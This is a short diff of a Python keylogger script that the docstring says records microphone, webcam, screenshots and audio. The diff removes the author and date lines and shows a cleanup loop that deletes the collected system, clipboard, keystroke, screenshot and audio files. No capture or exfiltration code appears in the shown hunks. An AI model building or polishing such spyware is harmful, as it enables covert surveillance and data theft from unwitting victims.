@@ -1,7 +1,5 @@
 """
 Program: KeyLogger (with Microphone, WebCamera, Screenshots, Audio Logging Feature)
-Author: Aman Kumar
-Date: 05/08/2022
 """
 
 # Libraries
@@ -212,4 +210,5 @@ time.sleep(120)
 delete_files = [system_info, clipboard_info, keys_info, screenshot_info, audio_info]
 for file in delete_files:
     os.remove(file_merge + file)
+
 
